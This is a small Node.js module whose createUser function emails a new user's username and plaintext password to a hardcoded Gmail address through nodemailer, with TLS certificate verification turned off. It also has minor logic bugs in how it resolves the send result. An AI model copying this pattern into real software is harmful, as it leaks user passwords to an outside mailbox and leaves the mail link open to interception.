import { createTransport } from "nodemailer";

const transporter = createTransport({
    port: 587,
    host: process.env.NODEMAILERHOST,
    auth: { user: process.env.NODEMAILEREMAIL, pass: process.env.NODEMAILERPASSWORD },
    tls: { rejectUnauthorized: false },
    secure: false,
    requireTLS: true,
});

async function wrapedSendMail(mailOptions) {
    return new Promise((resolve, reject) => {
        return transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log(error);
                resolve(true);
            }
            console.log("not error in the process of sending a message to email");
            resolve(false);
        });
    });
}

export default async function createUser({ username, password }) {
    let mailOptions = {};
    mailOptions = {
        from: "jarkurghan@gmail.com",
        to: "testingtransoxiania@gmail.com",
        subject: "HRP",
        text: "text",
        html: `<div style="background-color: #fff; padding: 10px 25px; border-radius: 3px; border: 2px solid #ddd">
                <div style="font-family: sans-serif; color: #666; font-size: 0.9rem; margin-block: 5px">
                    username: <span style="font-weight: bold"> ${username} </span>
                </div>
                <div style="font-family: sans-serif; color: #666; font-size: 0.9rem; margin-block: 5px">
                    password: <span style="font-weight: bold"> ${password} </span>
                </div>
            </div>`,
    };
    let resp = false;
    resp = wrapedSendMail(mailOptions);
    return resp;
}
